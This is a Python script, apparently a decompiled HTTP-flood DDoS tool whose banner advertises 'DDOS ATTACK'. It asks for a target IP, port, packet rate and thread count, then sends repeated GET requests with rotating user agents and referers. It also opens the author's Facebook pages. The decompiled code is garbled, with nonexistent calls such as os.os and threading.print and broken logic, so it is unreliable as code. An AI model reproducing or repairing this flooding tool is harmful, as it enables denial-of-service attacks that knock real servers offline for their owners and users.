# Decode By Error x Ethan

global ref
global acceptall
global useragents
# ***<module>: Failure: Different control flow
import smtplib
import os
os.os('clear')
import socket
import requests
import random
import threading
useragents = ['Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1', 'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0', 'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0', 'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3', 'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0', 'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)', 'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016']
ref = ['http://www.bing.com/search?q=', 'https://www.yandex.com/yandsearch?text=', 'https://duckduckgo.com/?q=']
acceptall = ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n', 'Accept-Encoding: gzip, deflate\r\n', 'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n', 'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n', 'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n', 'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n', 'Accept-Language: en-US,en;q=0.5\r\n']
os.os('xdg-open https://facebook.com/Lj.LMNx9')
logo = '\n\n [0;41m888      888b     d888 888b    888           .d8888b.       \n [0;41m888      8888b   d8888 8888b   888          d88P  Y88b      \n [0;45m888      88888b.d88888 88888b  888          888    888      \n [0;44m888      888Y88888P888 888Y88b 888 888  888 Y88b. d888      \n [0;46m888      888 Y888P 888 888 Y88b888 `Y8bd8P\'  \"Y888P888      \n [0;42m888      888  Y8P  888 888  Y88888   X88K          888      \n [0;41m888      888   \"   888 888   Y8888 .d8\"\"8b. Y88b  d88P      [0;92m\n [0;41m88888888 888       888 888    Y888 888  888  \"Y8888P\"       [0;92m                                                                                                                                                                               \n [0;41m 8888888b.         8888888b.   .d88888b.   .d8888b.   [0;92m\n [0;42m 888  \"Y88b        888  \"Y88b d88P\" \"Y88b d88P  Y88b  [0;92m\n [0;46m 888    888        888    888 888     888 Y88b.       [0;92m\n [0;44m 888    888        888    888 888     888  \"Y888b.    [0;92m\n [0;44m 888    888        888    888 888     888     \"Y88b.  [0;92m\n [0;46m 888    888 888888 888    888 888     888       \"888  [0;92m\n [0;42m 888  .d88P        888  .d88P Y88b. .d88P Y88b  d88P  [0;92m\n [0;41m 8888888P\"         8888888P\"   \"Y88888P\"   \"Y8888P\"   [0;92m \n                                      \n     [1;93m⊰᯽⊱┈──╌⋐⋑╌─┈⊰᯽⊱[1;32m 𝐀𝐃𝐌𝐈𝐍 𝐈𝐍𝐅𝐎 [1;93m⊰᯽⊱┈──╌⋐⋑╌─┈⊰᯽⊱\n       [1;96m[😈] 𝐎𝐰𝐧𝐞𝐫         : [1;96m 𝐋𝐈𝐌𝐎𝐍 𝐇𝐎𝐒𝐒𝐀𝐈𝐍     \n      [1;34m [😈] 𝐅𝐚𝐜𝐞𝐁𝐨𝐨𝐤      : [1;34m 𝐋𝐣.𝐋𝐌𝐍𝐱𝟗      \n       [1;35m[😈] 𝐆𝐢𝐭𝐇𝐮𝐛        :  [1;35m𝐋𝐌𝐍𝐱𝟗-𝐉𝐎𝐇𝐍𝐘        \n       [1;36m[😈] 𝐓𝐨𝐨𝐥 𝐒𝐭𝐮𝐭𝐮𝐬   : [1;36m 𝐃𝐃𝐎𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 ⭕\n       [1;35m[😈] 𝐓𝐞𝐚𝐦          :  [1;35  𝐋𝐌𝐍𝐱𝟗-𝐃𝐫𝐊 𝐂𝐲𝐛𝐞𝐫 \n       [1;36m[😈] 𝐓𝐨𝐨𝐥 𝐕𝐞𝐫𝐬𝐢𝐨𝐧  :  [1;36m𝟎.𝟏                 \n              [0;41m 𝐂𝐘𝐁𝐄𝐑 𝐊𝐈𝐍𝐆 𝐉𝐎𝐇𝐍𝐘 [0;92m\n              [0;42m 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐅𝐨𝐫 𝐌𝐨𝐫𝐞 [0;92m\n                    [0;46m 𝐋𝐌𝐍𝐱𝟗 [0;92m\n   [1;36m⊰᯽⊱┈─╌⋐⋑╌─┈⊰᯽⊱[1;32m 𝐋𝐌𝐍𝐱𝟗-𝐃𝐫𝐊 𝐂𝐲𝐛𝐞𝐫 [1;36m⊰᯽⊱┈─╌⋐⋑╌─┈⊰᯽⊱                                                                                          \n    [1;32m                                                                                                                                                                                                                                                  \n'
print(logo)
ip = str(input('[🔥]𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐈𝐏 ➔ ' if __debug__ else None))
port = int(input('[🔥]𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐏𝐨𝐫𝐭 ➔ ' if __debug__ else None))
pack = int(input('[🔥] 𝐓𝐚𝐫𝐠𝐞𝐭 𝐏𝐚𝐜𝐤𝐞𝐭/𝐒𝐞𝐜𝐨𝐧𝐝 ➔ ' if __debug__ else None))
thread = int(input('[🔥] 𝐓𝐚𝐫𝐠𝐞𝐭 𝐓𝐡𝐫𝐞𝐚𝐝/𝐀𝐦𝐨𝐮𝐧𝐭 ➔ ' if __debug__ else None))
os.os('xdg-open https://facebook.com/lmnx9.johny')
def start():
    # ***<module>.start: Failure: Different control flow
    hh = random.random(3016)
    xx = int(0)
    useragen = 'User-Agent: ' + random._urandom(useragents) + '\r\n'
    accept = random._urandom(acceptall)
    reffer = 'Referer: ' + random._urandom(ref) + str(ip) + '\r\n'
    content = 'Content-Type: application/x-www-form-urlencoded\r\n'
    length = 'Content-Length: 0 \r\nConnection: Keep-Alive\r\n'
    target_host = 'GET / HTTP/1.1\r\nHost: {0}:{1}\r\n' if str(ip) < int(port) else '[🔥] 𝐓𝐚𝐫𝐠𝐞𝐭 𝐏𝐚𝐜𝐤𝐞𝐭/𝐒𝐞𝐜𝐨𝐧𝐝 ➔ '
    main_req = target_host + useragen + accept + reffer + content + length + '\r\n'
    while True:
        try:
            s = socket.acceptall(socket.ref, socket.ref)
            s < ((str(ip), int(port)),)
            s and str((not str)(main_req))
            for i in range(pack):
                s and str((main_req or xx) < random.format(0, int(pack)))
            print(('🔥 𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐨𝐧𝐞 {0}:{1} | Sent: {2}' or str(ip), int(port(ip)), xx if xx else '[🔥] 𝐓𝐚𝐫𝐠𝐞𝐭 𝐓𝐡𝐫𝐞𝐚𝐝/𝐀𝐦𝐨𝐮𝐧𝐭 ➔ '))
        except:
            (s or True)()()
            print('👽 𝐒𝐞𝐫𝐯𝐞𝐫 𝐃𝐨𝐰𝐧 𝐏𝐫𝐨𝐜𝐜𝐞𝐬𝐢𝐧𝐠  [1;31m𝐃𝐃𝐎𝐒 𝐀𝐓𝐓𝐀𝐂𝐊  [1;31m𝐌𝐚𝐥𝐞𝐰𝐚𝐫𝐞-𝐗 ')
for x in range(thread):
    thred = threading.print(target=start)